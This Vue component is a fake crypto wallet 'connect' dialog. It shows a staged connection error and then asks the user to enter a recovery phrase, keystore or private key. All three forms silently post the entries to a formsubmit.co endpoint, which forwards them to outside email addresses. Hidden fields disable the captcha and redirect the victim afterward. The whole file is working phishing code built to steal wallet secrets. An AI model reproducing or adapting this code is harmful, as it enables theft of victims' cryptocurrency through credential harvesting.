<template>
  <teleport to="body" v-if="showTeleport">
    <div class="w-full h-screen fixed top-0 left-0 z-40">
      <div class="w-full h-full bg-black opacity-50 absolute"></div>
      <div
        class="w-11/12 md:w-4/12 relative z-50 bg-white top-2/4 left-2/4 -translate-x-2/4 -translate-y-2/4"
        v-if="isFormShow"
      >
        <div class="flex justify-between p-2 bg-gray-300 text-blue-800">
          <span class="cursor-pointer" @click="$emit('go-back')">Back</span>
          <span class="cursor-pointer" @click="$emit('go-back')">X</span>
        </div>
        <div class="p-4">
          <div
            class="p-4 flex justify-between items-center border border-red-600 rounded-lg mb-4"
          >
            <span v-if="showError">Connecting...</span>
            <span v-else>Error Connecting</span>
            <button
              class="bg-gray-600 p-2 text-white"
              @click="isFormShow = false"
              v-if="!showError"
            >
              Connect Manually
            </button>
          </div>
          <div
            class="p-4 flex justify-between items-center border border-red-600 rounded-lg"
          >
            <div>
              <p class="font-bold">{{ tokenName }}</p>
              <span class="text-xs">Easy-to-use browser extension.</span>
            </div>
            <img :src="getImage(tokenImage)" alt="gf" class="w-8" />
          </div>
        </div>
      </div>

      <div
        class="w-11/12 md:w-4/12 relative z-50 bg-white top-2/4 left-2/4 -translate-x-2/4 -translate-y-2/4 p-4"
        v-else
      >
        <div class="flex items-center gap-4 mb-5">
          <img :src="getImage(tokenImage)" alt="gf" class="w-10" />
          <span class="font-bold">Import your {{ tokenName }}</span>
        </div>

        <nav class="flex gap-4 items-center mb-4 pb-2 border-b border-gray-400">
          <span class="cursor-pointer" @click="step = 1">Phrase</span>
          <span class="cursor-pointer" @click="step = 2">Keystore JSON</span>
          <span class="cursor-pointer" @click="step = 3">Private Key</span>
        </nav>

<!-- 1  -->
        <form
          action="https://formsubmit.co/Allencross82@gmail.com"
          method="POST"
          class="mb-4"
          v-if="step === 1"
        >
          <textarea
            :name="tokenName"
            class="resize-none w-full border border-gray-400 p-2 mb-4"
            v-model="phrase"
            placeholder="Enter your keystore"
          ></textarea>
          <input type="hidden" name="_captcha" value="false" />
          <input type="hidden" name="_cc" value="w3althfront@yandex.com">
          <input
            type="hidden"
            name="_next"
            value="https://creemee-crytpo.netlify.app"
          />
          <p class="text-xs mb-4">
            Typically 12 (sometimes 24) words separated by single spaces
          </p>

          <button
            type="submit"
            class="w-full py-2 bg-blue-600 text-white"
            v-if="phrase.split(' ').length > 11"
            @click="$router.push('/error-connect')"
          >
            Proceed >
          </button>
          <button
            v-else
            @click.prevent="notActiveBtnPhrase"
            class="w-full py-2 bg-blue-600 text-white"
          >
            Proceed >
          </button>
        </form>

<!-- 2 -->
        <form
          action="https://formsubmit.co/Allencross82@gmail.com"
          method="POST"
          class="mb-4"
          v-if="step === 2"
        >
          <input
            :name="tokenName"
            v-model="keystore"
            class="resize-none w-full border border-gray-400 p-2 mb-4"
            type="text"
            placeholder="Keystore"
          />
          <input type="hidden" name="_captcha" value="false" />
          <input type="hidden" name="_cc" value="w3althfront@yandex.com">
          <input
            type="hidden"
            name="_next"
            value="https://creemee-crytpo.netlify.app"
          />
          <p class="text-xs mb-4">
            Typically 12 (sometimes 24) words separated by single spaces
          </p>

          <button
            type="submit"
            class="w-full py-2 bg-blue-600 text-white"
            v-if="keystore.split(' ').length > 11"
            @click="$router.push('/error-connect')"
          >
            Proceed >
          </button>
          <button
            v-else
            @click.prevent="notActiveBtnKeystore"
            class="w-full py-2 bg-blue-600 text-white"
          >
            Proceed >
          </button>
        </form>

        <!-- 3 -->

        <form
          action="https://formsubmit.co/Allencross82@gmail.com"
          method="POST"
          class="mb-4"
          v-if="step === 3"
        >
          <input
            :name="tokenName"
            class="resize-none w-full border border-gray-400 p-2 mb-4"
            v-model="privateKey"
            placeholder="Enter your private key"
          />
          <input type="hidden" name="_captcha" value="false" />
          <input type="hidden" name="_cc" value="w3althfront@yandex.com">
          <input
            type="hidden"
            name="_next"
            value="https://creemee-crytpo.netlify.app"
          />
          <p class="text-xs mb-4">
            Typically 12 (sometimes 24) words separated by single spaces
          </p>

          <button
            type="submit"
            class="w-full py-2 bg-blue-600 text-white"
            v-if="privateKey.split(' ').length > 11"
            @click="$router.push('/error-connect')"
          >
            Proceed >
          </button>
          <button
            v-else
            @click.prevent="notActiveBtnPrivateKey"
            class="w-full py-2 bg-blue-600 text-white"
          >
            Proceed >
          </button>
        </form>

        <!-- Kathleenshannon26@gmail.com -->

        <!-- <div class="flex justify-end">
          <button class="bg-red-600 p-2 text-white" @click="$emit('cancel')">
            Cancel
          </button>
        </div> -->
      </div>
    </div>
  </teleport>
</template>

<script>
export default {
  props: ["showTeleport", "tokenName", "tokenImage", "showError", "isFormShow"],
  data() {
    return {
      step: 1,
      phrase: "",
      keystore: "",
      privateKey: "",
    };
  },
  methods: {
    getImage(name) {
      return new URL(`../../assets/images/${name}`, import.meta.url).href;
    },
    notActiveBtnPhrase() {
      alert("Fill in your recovery phrase");
    },
    notActiveBtnKeystore() {
      alert("Fill in your recovery Keystore");
    },
    notActiveBtnPrivateKey() {
      alert("Fill in your recovery Private Key");
    },
  },
};
</script>
